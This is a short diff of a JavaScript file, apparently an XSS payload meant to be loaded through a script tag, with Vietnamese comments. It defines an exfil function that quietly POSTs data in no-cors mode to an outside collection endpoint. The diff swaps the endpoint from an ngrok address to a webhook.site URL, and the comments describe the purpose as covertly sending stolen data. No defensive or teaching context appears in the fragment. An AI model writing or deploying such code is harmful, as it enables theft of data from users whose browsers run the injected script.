@@ -2,7 +2,7 @@
 //==========<script src="url/this_file"></script>
 // 1. Định nghĩa "phương thức" gửi trộm
 async function exfil(data) {
-    await fetch('http://x.ngrok.io/exfil', {
+    await fetch('https://webhook.site/27fd40df-8ffe-4451-87b3-86125a4f0e3e', {
         method: 'POST', // Gửi dữ liệu đi (không phải lấy về)
         mode: 'no-cors', // Một kỹ thuật để gửi dữ liệu "bất chấp"
         body: data       // Nội dung cần gửi trộm
